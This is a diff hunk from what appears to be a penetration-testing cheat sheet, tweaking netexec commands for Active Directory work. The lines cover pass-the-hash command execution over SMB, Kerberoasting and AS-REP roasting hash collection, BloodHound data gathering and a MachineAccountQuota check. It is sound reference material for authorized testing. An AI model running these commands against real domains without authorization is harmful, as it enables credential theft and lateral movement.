@@ -1417,9 +1417,9 @@ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"                     
 
 # LDAP
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users                             # active AD users
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting        # collect Kerberoast hashes
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast              # collect AS-REP roast hashes
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All             # collect BloodHound data
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting       # collect Kerberoast hashes
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast             # collect AS-REP roast hashes
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server '<IP>' --bloodhound -c All    # collect BloodHound data
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq                                     # MachineAccountQuota lets users add domain computers.
 
 # WinRM
